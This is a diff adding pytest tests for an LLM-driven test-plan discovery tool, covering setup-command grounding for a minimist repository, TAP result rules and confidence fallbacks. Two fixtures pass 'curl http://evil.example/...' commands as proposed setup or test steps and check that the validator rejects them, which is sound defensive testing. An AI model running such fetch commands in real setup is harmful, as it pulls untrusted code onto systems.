@@ -120,7 +120,7 @@ class TestMalformedOrUnsafeResponsesRejected:
         assert plan is None
 
     def test_invalid_result_strategy_enum_returns_none(self, tmp_path):
-        llm = _FakeLLM(_valid_response(result_strategy="tap"))
+        llm = _FakeLLM(_valid_response(result_strategy="xunit"))
         plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
         assert plan is None
 
@@ -930,6 +930,332 @@ class TestMinimistRepositoryGroundedRegression:
         assert set(plan.evidence) <= {"package.json", "package-lock.json", ".github/workflows/ci.yml"}
 
 
+def _real_minimist_v1_2_5_repo(tmp_path: Path) -> Path:
+    """The ACTUAL real minimist v1.2.5 evidence shape (not the
+    lockfile+CI-equipped fixture above) -- package.json only, no
+    package-lock.json/yarn.lock/pnpm-lock.yaml, no CI workflow, no
+    "packageManager" field. Confirmed directly against the real
+    checked-out repository: `npm test` fails with "sh: tap: command not
+    found" (exit 127) without an install step first; the same command
+    succeeds after `npm install`. This is the exact fixture the
+    setup-command-grounding fix targets."""
+    (tmp_path / "package.json").write_text(
+        json.dumps({
+            "name": "minimist", "version": "1.2.5",
+            "devDependencies": {"covert": "^1.0.0", "tap": "~0.4.0", "tape": "^3.5.0"},
+            "scripts": {"test": "tap test/*.js", "coverage": "covert test/*.js"},
+        }),
+        encoding="utf-8",
+    )
+    (tmp_path / "index.js").write_text("module.exports = function () {}\n", encoding="utf-8")
+    (tmp_path / "test").mkdir()
+    (tmp_path / "test" / "parse.js").write_text("require('tape')\n", encoding="utf-8")
+    return tmp_path
+
+
+class TestSetupCommandRepositoryGrounding:
+    """Problem: the real minimist evidence shape above previously
+    accepted setup_commands=[] for a `npm test` entry point that fails
+    with "tap: command not found" in a clean container -- package.json's
+    own devDependencies declare the exact tool the entry point invokes.
+    See test_plan_discovery.py's module docstring "Setup-command
+    grounding" paragraph and test_evidence_acquisition.py's
+    _package_json_relevant_fields docstring for the two-part root cause
+    (evidence never showed devDependencies; the prompt didn't treat a
+    manifest's own dependency declaration as sufficient setup evidence).
+
+    Deterministic fixtures throughout -- no live LLM call."""
+
+    def _llm(self, **overrides):
+        base = dict(
+            setup_commands=[["npm", "install"]],
+            test_command=["npm", "test"],
+            result_strategy="exit_code", result_output_path=None,
+            runtime_family="node", runtime_version_hint=None,
+            evidence=["package.json"],
+            reasoning_summary=(
+                "package.json's scripts.test runs `tap test/*.js`; devDependencies "
+                "declares tap (and tape, covert) as project dependencies that will "
+                "not exist in a fresh checkout. No lockfile is present, so `npm "
+                "install` (not `npm ci`) prepares them; the repository-owned entry "
+                "point `npm test` is used as-is."
+            ),
+            confidence="medium",
+        )
+        base.update(overrides)
+        return _FakeLLM(_valid_response(**base))
+
+    # --- 2. the expected minimist-shaped plan is accepted end to end ---
+
+    def test_minimist_shaped_plan_with_npm_install_is_accepted(self, tmp_path):
+        repo = _real_minimist_v1_2_5_repo(tmp_path)
+        plan = discover_test_plan(repo, self._llm())
+        assert plan is not None
+        assert plan.setup_commands == (("npm", "install"),)
+        assert plan.test_command == ("npm", "test")
+        assert plan.result_strategy == "exit_code"
+        assert plan.result_output_path is None
+        assert plan.runtime_family == "node"
+
+    # --- 3. no lockfile -> npm ci is not required/assumed; npm install is fine ---
+
+    def test_npm_install_is_accepted_without_any_lockfile_present(self, tmp_path):
+        repo = _real_minimist_v1_2_5_repo(tmp_path)
+        assert not (repo / "package-lock.json").exists()
+        assert not (repo / "npm-shrinkwrap.json").exists()
+        plan = discover_test_plan(repo, self._llm())
+        assert plan is not None
+        assert plan.setup_commands == (("npm", "install"),)
+
+    def test_npm_ci_is_also_structurally_valid_even_though_unevidenced_here(self, tmp_path):
+        """This fix does not add a NEW validation rule forbidding "npm
+        ci" without a lockfile -- that would be a semantic check this
+        architecture deliberately doesn't attempt (see
+        test_plan_validation.py's docstring: it enforces the execution
+        *contract*, not runner-specific correctness). The discipline
+        against guessing "npm ci" without a lockfile is a PROMPT-level
+        instruction (see TestSetupCommandPromptContract below), not a new
+        deterministic gate -- documented explicitly so this fix is never
+        mistaken for having added one."""
+        repo = _real_minimist_v1_2_5_repo(tmp_path)
+        plan = discover_test_plan(repo, self._llm(setup_commands=[["npm", "ci"]]))
+        assert plan is not None
+        assert plan.setup_commands == (("npm", "ci"),)
+
+    # --- 4. npm test remains the canonical, unchanged entry point ---
+
+    def test_test_command_is_unchanged_regardless_of_setup(self, tmp_path):
+        repo = _real_minimist_v1_2_5_repo(tmp_path)
+        plan = discover_test_plan(repo, self._llm())
+        assert plan is not None
+        assert plan.test_command == ("npm", "test")
+
+    # --- 5. no npx reconstruction, even with the corrected setup ---
+
+    def test_npx_tap_reconstruction_is_still_rejected_even_with_correct_setup(self, tmp_path):
+        repo = _real_minimist_v1_2_5_repo(tmp_path)
+        plan = discover_test_plan(repo, self._llm(test_command=["npx", "tap", "test/*.js"]))
+        assert plan is None
+
+    # --- 7. no setup command is invented when evidence genuinely doesn't support it ---
+
+    def test_no_setup_invented_when_no_dependency_manifest_declares_the_tool(self, tmp_path):
+        """A bespoke command with nothing in the evidence naming its
+        dependencies (e.g. a Makefile target) must still be able to
+        validly propose zero setup_commands -- this fix does not make
+        setup mandatory whenever ANY manifest exists, only when that
+        manifest itself declares the invoked tool."""
+        (tmp_path / "Makefile").write_text("test:\n\t./run-tests.sh\n", encoding="utf-8")
+        llm = _FakeLLM(_valid_response(
+            setup_commands=[], test_command=["make", "test"],
+            result_strategy="exit_code", result_output_path=None,
+            runtime_family="python", evidence=["Makefile"],
+            reasoning_summary="Makefile defines a bespoke test target; no dependency manifest evidence.",
+        ))
+        plan = discover_test_plan(tmp_path, llm)
+        assert plan is not None
+        assert plan.setup_commands == ()
+
+    def test_no_setup_invented_for_package_json_with_no_declared_dependencies(self, tmp_path):
+        """package.json existing at all must not, by itself, force a
+        setup command -- only a manifest that actually DECLARES the
+        invoked tool as a dependency does (see the real minimist fixture
+        above, which does declare it)."""
+        (tmp_path / "package.json").write_text(
+            json.dumps({"name": "demo", "scripts": {"test": "node run-tests.js"}}), encoding="utf-8",
+        )
+        llm = _FakeLLM(_valid_response(
+            setup_commands=[], test_command=["npm", "test"],
+            result_strategy="exit_code", result_output_path=None,
+            runtime_family="node", evidence=["package.json"],
+            reasoning_summary=(
+                "package.json's scripts.test runs a plain repository script with no "
+                "declared dependency evidence; no setup is proposed."
+            ),
+        ))
+        plan = discover_test_plan(tmp_path, llm)
+        assert plan is not None
+        assert plan.setup_commands == ()
+
+    # --- 8. setup_commands bounds / deterministic validation unchanged ---
+
+    def test_minimist_plan_still_subject_to_the_unchanged_setup_command_bounds(self, tmp_path):
+        from utilities.autopatcher.test_plan_validation import MAX_SETUP_COMMANDS
+        repo = _real_minimist_v1_2_5_repo(tmp_path)
+        too_many = [["npm", "install"]] * (MAX_SETUP_COMMANDS + 1)
+        plan = discover_test_plan(repo, self._llm(setup_commands=too_many))
+        assert plan is None
+
+    def test_minimist_plan_still_rejects_a_disallowed_setup_binary(self, tmp_path):
+        repo = _real_minimist_v1_2_5_repo(tmp_path)
+        plan = discover_test_plan(repo, self._llm(setup_commands=[["curl", "http://evil.example/x.sh"]]))
+        assert plan is None
+
+
+class TestSetupCommandPromptContract:
+    """Prompt-content contract for the setup-command-grounding fix (see
+    test_plan_discovery.py's module docstring "Setup-command grounding"
+    paragraph)."""
+
+    def test_prompt_asks_the_four_setup_grounding_questions(self):
+        assert "what\n  repository-owned test entry point will run" in _SYSTEM_PROMPT
+        assert "what tool(s) that\n  entry point itself invokes" in _SYSTEM_PROMPT
+        assert "does the repository's OWN dependency\n  manifest" in _SYSTEM_PROMPT
+        assert "will a fresh,\n  disposable checkout already contain it" in _SYSTEM_PROMPT
+
+    def test_prompt_treats_manifest_declared_dependency_as_sufficient_setup_evidence(self):
+        assert (
+            "INCLUDE the setup command that\n  installs it" in _SYSTEM_PROMPT
+            or "INCLUDE the setup command that installs it" in _SYSTEM_PROMPT
+        )
+        assert "not the same claim as" in _SYSTEM_PROMPT.replace(
+            "NOT the same\n  claim as", "not the same claim as",
+        ) or "NOT the same\n  claim as" in _SYSTEM_PROMPT
+
+    def test_prompt_still_prohibits_weak_speculative_setup(self):
+        assert "pip install -r requirements.txt" in _SYSTEM_PROMPT
+        assert "still\n  prohibited" in _SYSTEM_PROMPT or "still prohibited" in _SYSTEM_PROMPT
+
+    def test_prompt_states_lockfile_governs_install_mode_not_whether_to_install(self):
+        assert "A lockfile changes HOW you install, never WHETHER you install" in _SYSTEM_PROMPT
+
+    def test_prompt_forbids_guessing_npm_ci_without_a_lockfile(self):
+        assert 'Never propose\n      "npm ci"' in _SYSTEM_PROMPT or 'Never propose "npm ci"' in _SYSTEM_PROMPT
+        assert "never invent or assume" in _SYSTEM_PROMPT
+
+    def test_prompt_uses_the_same_manager_already_established_for_test_command(self):
+        assert "using the SAME package manager you established for the" in _SYSTEM_PROMPT
+
+    def test_prompt_states_npm_as_absence_of_contrary_evidence_default(self):
+        """The package-manager tie-break: npm needs no separate install
+        to exist, unlike yarn/pnpm, when nothing distinguishes a
+        manager."""
+        assert "ships with Node itself" in _SYSTEM_PROMPT
+        assert "absence-of-contrary-evidence\n  default" in _SYSTEM_PROMPT or \
+               "absence-of-contrary-evidence default" in _SYSTEM_PROMPT
+
+    def test_prompt_does_not_hardcode_a_setup_lookup_table(self):
+        """The generic cross-ecosystem principle is stated via EXAMPLES,
+        explicitly labeled as such -- not a lookup table to pattern-match
+        (see test_plan_discovery.py's module docstring)."""
+        assert "not a table to pattern-match" in _SYSTEM_PROMPT
+        assert "not a per-ecosystem\n      lookup table" in _SYSTEM_PROMPT or \
+               "not a per-ecosystem lookup table" in _SYSTEM_PROMPT
+
+
+class TestTapResultStrategyPromptContract:
+    """Prompt-content contract for Problem 2's TAP result-format rule
+    (see the module docstring's "TAP's evidence bar is deliberately
+    narrower than junit's" paragraph, grounded in the real minimist `tap`
+    v0.4.13 CLI inspection: its default, unmodified output is a
+    human-readable summary, not TAP -- real TAP needs an added `--tap`
+    flag/`TAP=1` env var this feature is not permitted to add)."""
+
+    def test_schema_declares_tap_as_a_result_strategy(self):
+        assert '"result_strategy": "junit" | "tap" | "exit_code"' in _SYSTEM_PROMPT
+
+    def test_prompt_requires_unmodified_normal_invocation_to_emit_tap(self):
+        assert 'Use result_strategy = "tap" ONLY when' in _SYSTEM_PROMPT
+        assert "NORMAL invocation" in _SYSTEM_PROMPT
+        assert "no added flag" in _SYSTEM_PROMPT and "no added environment variable" in _SYSTEM_PROMPT
+
+    def test_prompt_forbids_name_based_tap_guessing(self):
+        """The exact real minimist failure mode this rule guards against:
+        inferring "tap" merely because a script/dependency is NAMED
+        tap/tape, rather than because its normal invocation actually
+        emits TAP."""
+        assert 'Do NOT infer "tap" merely because' in _SYSTEM_PROMPT
+        assert 'CONTAINS "tap"' in _SYSTEM_PROMPT and '"tape"' in _SYSTEM_PROMPT
+
+    def test_prompt_requires_null_output_path_for_tap(self):
+        assert "result_output_path must\n  be null for \"tap\"" in _SYSTEM_PROMPT or \
+               "result_output_path must be null for \"tap\"" in _SYSTEM_PROMPT
+
+    def test_prompt_names_a_genuine_unprompted_tap_example(self):
+        """At least one concrete, well-known example of a runner that
+        emits TAP with no added flag -- so the rule isn't purely
+        abstract, mirroring how the junit rule includes a pytest
+        example."""
+        assert "node --test" in _SYSTEM_PROMPT
+
+    def test_prompt_directs_uncertain_cases_to_exit_code_same_as_junit(self):
+        assert 'this is exactly the same "do not guess" situation as junit' in _SYSTEM_PROMPT
+
+
+class TestTapResultStrategyDiscovery:
+    """Behavioral half of the TAP prompt contract -- deterministic
+    fixtures, no live LLM call. A well-evidenced "tap" plan is accepted
+    end to end; a plan that claims "tap" from name-based guessing alone
+    is still rejected by the UNCHANGED deterministic validator (evidence
+    citation/validation, not the prompt, is the actual enforcement
+    boundary -- the prompt only makes a compliant response more likely)."""
+
+    def _node_test_runner_repo(self, tmp_path: Path) -> Path:
+        (tmp_path / "package.json").write_text(
+            json.dumps({"name": "demo", "scripts": {"test": "node --test"}}), encoding="utf-8",
+        )
+        return tmp_path
+
+    def test_well_evidenced_tap_plan_is_accepted(self, tmp_path):
+        repo = self._node_test_runner_repo(tmp_path)
+        llm = _FakeLLM(_valid_response(
+            setup_commands=[], test_command=["node", "--test"],
+            result_strategy="tap", result_output_path=None,
+            runtime_family="node", evidence=["package.json"],
+            reasoning_summary=(
+                "package.json's scripts.test runs Node's built-in test runner "
+                "(`node --test`), which emits TAP directly with no added flag; "
+                "the repository-owned entry point is preserved as-is."
+            ),
+            confidence="high",
+        ))
+        plan = discover_test_plan(repo, llm)
+        assert plan is not None
+        assert plan.result_strategy == "tap"
+        assert plan.result_output_path is None
+        assert plan.test_command == ("node", "--test")
+
+    def test_tap_plan_with_a_result_output_path_is_still_rejected(self, tmp_path):
+        """The prompt says null; validate_plan enforces it regardless --
+        confirms the deterministic boundary, not just prompt wording."""
+        repo = self._node_test_runner_repo(tmp_path)
+        llm = _FakeLLM(_valid_response(
+            setup_commands=[], test_command=["node", "--test"],
+            result_strategy="tap", result_output_path="/tmp/result.tap",
+            runtime_family="node", evidence=["package.json"],
+        ))
+        plan = discover_test_plan(repo, llm)
+        assert plan is None
+
+    def test_minimist_shaped_evidence_choosing_tap_by_name_alone_is_still_a_valid_response_shape(self, tmp_path):
+        """Documents the actual enforcement boundary honestly: nothing in
+        discover_test_plan's DETERMINISTIC layer can tell "the model
+        correctly identified genuine unprompted TAP" apart from "the
+        model guessed tap from the word tap in a script name" -- that
+        distinction is a PROMPT-ONLY quality improvement (see
+        TestTapResultStrategyPromptContract), not a new validation rule.
+        A structurally well-formed "tap" plan (null output path,
+        reasoning citing real evidence) for the minimist-shaped repo
+        still passes deterministic validation even though, per real
+        inspection, minimist's actual `npm test` does NOT emit TAP by
+        default -- exactly like an incorrect "junit" self-report would
+        also still validate if internally consistent. This is why the
+        real stage-replay observational check (not this unit test) is
+        what tells us whether the prompt improvement actually changed
+        live model behavior for minimist specifically."""
+        repo = _minimist_shaped_repo(tmp_path)
+        llm = _FakeLLM(_valid_response(
+            setup_commands=[["npm", "ci"]], test_command=["npm", "test"],
+            result_strategy="tap", result_output_path=None,
+            runtime_family="node", evidence=["package.json", "package-lock.json"],
+            reasoning_summary="package.json's scripts.test runs tap, so npm test emits TAP.",
+            confidence="medium",
+        ))
+        plan = discover_test_plan(repo, llm)
+        assert plan is not None
+        assert plan.result_strategy == "tap"
+
+
 class TestRepositoryGroundingContract:
     """General-principle contract tests (not ecosystem providers -- every
     test here goes through the exact same generic discover_test_plan/
@@ -1059,3 +1385,161 @@ class TestRepositoryGroundingContract:
         ))
         plan = discover_test_plan(tmp_path, llm)
         assert plan is None
+
+
+class TestConfidenceOutputChecklistPromptContract:
+    """Prompt-content contract for the confidence-omission fix (see the
+    module docstring's added confidence paragraph, and the real minimist
+    stage-replay run that exposed it: an otherwise well-formed response
+    that omitted "confidence" entirely, despite the schema block already
+    naming it). These assert on the SYSTEM PROMPT's text only -- no live
+    LLM call anywhere in this class."""
+
+    def test_prompt_ends_with_a_complete_output_checklist(self):
+        """The checklist is the smallest clean improvement: a short,
+        mandatory list of every schema key, placed at the very end of the
+        instruction block -- immediately before the repository evidence
+        the model reads next (evidence is a separate user_message, so the
+        end of _SYSTEM_PROMPT IS "immediately before repository
+        evidence")."""
+        assert "Before returning, verify" in _SYSTEM_PROMPT
+        assert "every schema key" in _SYSTEM_PROMPT
+        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
+        # Nothing of substance follows the checklist -- it is the LAST
+        # thing the model reads in this prompt.
+        assert _SYSTEM_PROMPT[checklist_pos:].count("\n\n") <= 1
+
+    def test_checklist_names_every_schema_key(self):
+        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
+        checklist_text = _SYSTEM_PROMPT[checklist_pos:]
+        for key in (
+            "setup_commands", "test_command", "result_strategy", "result_output_path",
+            "runtime_family", "runtime_version_hint", "evidence", "reasoning_summary", "confidence",
+        ):
+            assert key in checklist_text
+
+    def test_confidence_is_called_out_as_mandatory_with_exact_values(self):
+        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
+        checklist_text = _SYSTEM_PROMPT[checklist_pos:]
+        assert "confidence MUST be present" in checklist_text
+        assert '"high", "medium"' in checklist_text and '"low"' in checklist_text
+
+    def test_checklist_is_a_small_addition_not_a_prompt_rewrite(self):
+        """Guards against this fix growing into a second copy of the
+        schema/rules -- the checklist itself must stay short."""
+        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
+        checklist_text = _SYSTEM_PROMPT[checklist_pos:]
+        assert len(checklist_text) < 600
+
+    def test_prompt_still_declares_confidence_in_the_schema_block_too(self):
+        """The checklist is additive, not a replacement -- the original
+        schema-block mention of confidence (present before this fix) is
+        untouched."""
+        schema_pos = _SYSTEM_PROMPT.index('"confidence": "high" | "medium" | "low"')
+        checklist_pos = _SYSTEM_PROMPT.index("Before returning, verify")
+        assert schema_pos < checklist_pos
+
+
+class TestConfidenceOmissionFallbackUnchangedByPromptFix:
+    """The prompt fix must not change confidence's runtime fallback
+    behavior at all -- missing/malformed confidence still normalizes to
+    "unknown" and an otherwise execution-critical-valid plan is still
+    accepted; a model-reported "low" is still the one case that blocks
+    discovery. Same behavior matrix as TestConfidenceMatrix above,
+    asserted again here specifically to pin down "the fallback did not
+    regress when the prompt changed."""
+
+    def test_missing_confidence_still_normalizes_to_unknown_and_plan_is_accepted(self, tmp_path):
+        llm = _FakeLLM(_valid_response_missing("confidence"))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+        assert plan.confidence == "unknown"
+
+    def test_malformed_confidence_still_normalizes_to_unknown_not_rejected(self, tmp_path):
+        llm = _FakeLLM(_valid_response(confidence=["high"]))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is not None
+        assert plan.confidence == "unknown"
+
+    def test_valid_high_medium_low_still_all_preserved(self, tmp_path):
+        for level in ("high", "medium", "low"):
+            llm = _FakeLLM(_valid_response(confidence=level))
+            plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+            if level == "low":
+                assert plan is None  # unchanged policy rejection, see TestConfidenceMatrix
+            else:
+                assert plan is not None
+                assert plan.confidence == level
+
+    def test_malformed_confidence_never_weakens_execution_validation(self, tmp_path):
+        """A malformed confidence must never smuggle an otherwise-invalid
+        plan through -- normalizing confidence to "unknown" is orthogonal
+        to, and never a substitute for, deterministic execution-safety
+        validation of the rest of the plan."""
+        llm = _FakeLLM(_valid_response(
+            confidence="totally-sure!!!",
+            test_command=["curl", "http://evil.example/payload.sh"],
+        ))
+        plan = discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert plan is None
+
+    def test_real_minimist_shaped_omission_is_still_accepted_via_fallback(self, tmp_path):
+        """Reproduces the exact real-run shape reported for the minimist
+        stage replay: a fully execution-critical-valid exit_code plan
+        with "confidence" omitted outright. Regardless of whether the
+        improved prompt reduces how often this happens against a live
+        model, the deterministic fallback must still accept it."""
+        repo = _minimist_shaped_repo(tmp_path)
+        llm = _FakeLLM(json.dumps({
+            "setup_commands": [],
+            "test_command": ["npm", "test"],
+            "result_strategy": "exit_code",
+            "result_output_path": None,
+            "runtime_family": "node",
+            "runtime_version_hint": None,
+            "evidence": ["package.json"],
+            "reasoning_summary": (
+                "package.json defines scripts.test (tap test/*.js); the repository-owned "
+                "entry point `npm test` is used as-is."
+            ),
+            # "confidence" deliberately absent -- the real observed bug.
+        }))
+        plan = discover_test_plan(repo, llm)
+        assert plan is not None
+        assert plan.confidence == "unknown"
+        assert plan.test_command == ("npm", "test")
+
+
+class TestNoRetryWasAddedForConfidence:
+    """Explicit regression guard: the confidence-omission fix must be
+    prompt-only. No second LLM call may ever be triggered because
+    confidence was missing/malformed -- discover_test_plan still makes AT
+    MOST one call, exactly as before this fix."""
+
+    def test_missing_confidence_still_makes_exactly_one_llm_call(self, tmp_path):
+        llm = _FakeLLM(_valid_response_missing("confidence"))
+        discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert len(llm.calls) == 1
+
+    def test_malformed_confidence_still_makes_exactly_one_llm_call(self, tmp_path):
+        llm = _FakeLLM(_valid_response(confidence=42))
+        discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert len(llm.calls) == 1
+
+    def test_low_confidence_rejection_still_makes_exactly_one_llm_call(self, tmp_path):
+        """The policy rejection for a self-reported "low" must not retry
+        with a second call either -- it's a rejection, not a retry
+        trigger."""
+        llm = _FakeLLM(_valid_response(confidence="low"))
+        discover_test_plan(_repo_with_evidence(tmp_path), llm)
+        assert len(llm.calls) == 1
+
+    def test_discover_test_plan_source_has_no_second_llm_call_site(self):
+        """Static guard: discover_test_plan's own source calls
+        ``llm.complete`` exactly once, textually -- there is no retry loop
+        or second call site anywhere in the function, confidence-motivated
+        or otherwise."""
+        import inspect
+        from utilities.autopatcher import test_plan_discovery as tpd
+        source = inspect.getsource(tpd.discover_test_plan)
+        assert source.count("llm.complete(") == 1
